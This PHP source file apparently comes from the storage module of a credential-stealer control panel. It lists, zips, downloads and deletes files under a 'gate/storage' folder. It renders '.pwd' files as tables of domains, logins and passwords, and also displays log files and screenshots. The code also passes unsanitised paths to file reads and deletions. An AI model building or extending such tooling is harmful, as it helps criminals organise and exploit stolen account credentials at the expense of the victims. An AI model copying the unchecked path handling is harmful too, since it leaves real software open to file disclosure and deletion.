<?php
	function rrmdir($dir, $res = false)
	{
		if (is_dir($dir))
		{
			$objects = scandir($dir);
			foreach ($objects as $object)
			{
				if ($object != '.' && $object != '..')
				{
					if(filetype("$dir/$object") == 'dir')
					{
						rrmdir("$dir/$object", true);
						rmdir("$dir/$object");
					}
					else unlink("$dir/$object");
				}
			}
			reset($objects);
			if($res) rmdir($res);
		}
	}
	function createZip($files = array(), $destination = '', $tod = '', $overwrite = false)
	{
		if(file_exists($destination) && !$overwrite) return false;
		$valid_files = array();
		if(is_array($files)) 
		{
			foreach($files as $file) 
			{
				if(file_exists($file))
				{
					$valid_files[] = $file;
				}
			}
		}
		if(count($valid_files))
		{
			$zip = new ZipArchive();
			if($zip->open($destination, $overwrite ? ZipArchive::OVERWRITE : ZipArchive::CREATE) !== true)
				return false;
			foreach($valid_files as $file)
			{
				$tmp = str_replace($tod, '', $file);
				if(is_dir($file))
					$zip->addEmptyDir($tmp);
				else
					$zip->addFile($file, $tmp);
			}
			$zip->close();
			return file_exists($destination);
		}
	}
	function recScan($path)
	{
		$files = scan($path);
		$fc = count($files);
		for($i=0;$i<$fc;$i++)
		{
			$files[$i] = "$path/".$files[$i];
			if((fileperms($files[$i]) & 0x4000) == 0x4000)
			{
				foreach(recScan($files[$i]) as $olly)
					$files[] = $olly;
				$files[$i] .= '/';
			}
		}
		return $files;
	}
	function scan($dir)
	{
		if(!file_exists($dir)) { echo 'kecklife';return null;}
		$result = array();
		$files = array_diff(scandir($dir), array('..', '.', '.htaccess', 'cgi-bin', '.DS_Store'));
		foreach($files as $file) $result[] = $file;
		return $result;
	}
	function scanByDate($dir) 
	{
		if(!file_exists($dir)) { echo 'kecklife';return null;}
		foreach (scan($dir) as $file)
		{
			if (in_array($file, array('..', '.', '.htaccess', 'cgi-bin', '.DS_Store'))) continue;
			$files[$file] = filemtime($dir . '/' . $file);
		}
		arsort($files);
		$files = array_keys($files);
		return ($files) ? $files : false;
	}
	class Model_Storage extends Model
	{
		public function getContents($path = null, $page = 0, &$pcount = 1)
		{
			$srt = false;
			if(empty($path)) $srt = true;
			$path = "gate/storage/$path";
			$result = array();
			$files = scanByDate($path);
			$fcount = count($files);
			$pcount = ceil($fcount / 10);
			if($page > $pcount) return null;
			$from = $page * 10;
			$tilde = ($page + 1) * 10;
			for($i=$from;$i<$tilde;$i++)
			{
				if(!isset($files[$i])) break;
				$olly = $files[$i];
				if(empty($olly)) continue;
				$mtyp = 1;
				$type = 'Unknown';
				if((fileperms("$path$olly") & 0x4000) == 0x4000)
				{
					$fc = count(scan("$path$olly"));
					$type = "Folder ($fc)";
					$mtyp = 0;
				}
				else
				{
					$ext = pathinfo("$path$olly", PATHINFO_EXTENSION);
					$exy = empty($ext) ? '' : "($ext)";
					$type = "File $exy";
					if(strcmp($ext, 'pwd') === 0)
						$mtyp = 2;
					else if(strcmp($ext, 'log') === 0 || strcmp($ext, 'txt') === 0)
						$mtyp = 3;
					else if(strcmp($ext, 'png') === 0)
						$mtyp = 4;
				}
				$result[] = array($olly, $type, $mtyp, date('d.m.y (h:m:i)', filemtime("$path$olly")));
			}
			if($srt) sort($result);
			return $result;
		}
		public function getResource($path, $type)
		{
			$path = "gate/storage/$path";
			$path = str_replace('\\', '/', $path);
			if($type == 1)
			{
				$olly = pathinfo($path);
				$ext = !empty($olly['extension']) ? '.'.$olly['extension'] : '';
				header('Content-Type: application/octet-stream');
				header('Content-Length: '.filesize($path));
				header("Content-Disposition: attachment; filename=".$olly['filename'].$ext);
				readfile($path);
			}
			else if($type == 4)
			{
				$im = null;
				$mime = exif_imagetype($path);
				if($mime == IMAGETYPE_JPEG)
				{
					$im = imagecreatefromjpeg($path);
					header('Content-Type: image/jpeg');
					imagejpeg($im);
				}
				else if($mime == IMAGETYPE_PNG)
				{
					$im = imagecreatefrompng($path);
					header('Content-Type: image/png');
					imagepng($im);
				}
				else if($mime == IMAGETYPE_GIF)
				{
					$im = imagecreatefromgif($path);
					header('Content-Type: image/gif');
					imagegif($im);
				}
				if($im != null) imagedestroy($im);
			}
			else if($type == 2)
			{
				$result = '<table class="table table-striped table-hover cntr"><tr><th>Domain</th><th>Login</th><th>Password</th></tr>';
				foreach(explode('<:;:!>', file_get_contents($path)) as $olly)
				{
					$kelly = explode('<;!:;>', $olly);
					$kelly[0] = !isset($kelly[0]) ? '' : $kelly[0];
					$kelly[1] = !isset($kelly[1]) ? '' : $kelly[1];
					$kelly[2] = !isset($kelly[2]) ? '' : $kelly[2];
					if(mb_strpos($kelly[0], '@') === false)
					{
						$url = $kelly[0];
						if(mb_strlen($url) > 26) $url = mb_substr($url, 0, 26).'...';
						$result .= '<tr><td><a href="http://'.htmlspecialchars($kelly[0]).'">'.htmlspecialchars($url).'</a></td><td>'.htmlspecialchars($kelly[1]).'</td><td>'.htmlspecialchars($kelly[2]).'</td></tr>';
					}
					else
					{
						$xplod = explode('@', $kelly[0]);
						$result .= '<tr><td><a  href="http://'.htmlspecialchars($xplod[1]).'">@'.htmlspecialchars($xplod[1]).'</a></td><td>'.htmlspecialchars($xplod[0]).'</td><td>'.htmlspecialchars($kelly[1]).'</td></tr>';
					}
				}
				$result .= '</table>';
				return $result;
			}
			else if($type == 3)
			{
				$var = file_get_contents($path);
				return nl2br(htmlspecialchars(mb_convert_encoding($var, 'UTF-8', 'cp1251')));
			}
			else if($type == 0)
			{
				$sq = recScan($path);
				if(count($sq) != 0)
				{
					$time = time();
					$fname = "temp/$time.zip";
					$wname = pathinfo($path)['filename'].'.zip';
					createZip($sq, $fname, "$path/");
					header('Content-Type: application/octet-stream');
					header('Content-Length: '.filesize($fname));
					header("Content-Disposition: attachment; filename=$wname");
					readfile($fname);
					unlink($fname);
				}
			}
		}
		public function remResource($path, $type)
		{
			$path = trim(str_replace('\\', '/', $path));
			if($type == 0)
			{
				rrmdir("gate/storage/$path", count(explode('/', $path)) <= 2 ? false : true);
			}
			else
			{
				unlink("gate/storage/$path");
			}
			return $path;
		}
	}
?>